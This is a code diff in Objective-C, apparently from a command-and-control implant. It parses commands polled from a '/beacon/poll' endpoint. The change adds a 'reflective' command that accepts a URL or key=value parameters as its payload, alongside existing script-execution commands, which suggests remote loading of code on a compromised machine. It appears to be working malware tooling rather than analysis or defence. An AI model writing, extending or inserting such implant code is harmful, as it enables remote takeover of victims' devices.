@@ -225,8 +225,24 @@ static NSString *const kCommandPollPath = @"/beacon/poll";
                         NSString *commandType = [commandStr substringToIndex:firstSpace.location];
                         NSString *args = [commandStr substringFromIndex:firstSpace.location + 1];
                         
-                        [commandDict setObject:commandType forKey:@"command"];
-                        [commandDict setObject:@{@"script": args} forKey:@"payload"];
+                        // Check if this is a reflective command with key=value format
+                        if ([commandType isEqualToString:@"reflective"]) {
+                            NSArray *keyValuePairs = [args componentsSeparatedByString:@"="];
+                            if (keyValuePairs.count == 2) {
+                                NSString *paramKey = [keyValuePairs[0] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
+                                NSString *paramValue = [keyValuePairs[1] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
+                                
+                                [commandDict setObject:commandType forKey:@"command"];
+                                [commandDict setObject:@{paramKey: paramValue} forKey:@"payload"];
+                            } else {
+                                // Handle the case where the URL is provided directly without key=value format
+                                [commandDict setObject:commandType forKey:@"command"];
+                                [commandDict setObject:@{@"url": args} forKey:@"payload"];
+                            }
+                        } else {
+                            [commandDict setObject:commandType forKey:@"command"];
+                            [commandDict setObject:@{@"script": args} forKey:@"payload"];
+                        }
                     } else {
                         // Command has no arguments
                         [commandDict setObject:value forKey:key];
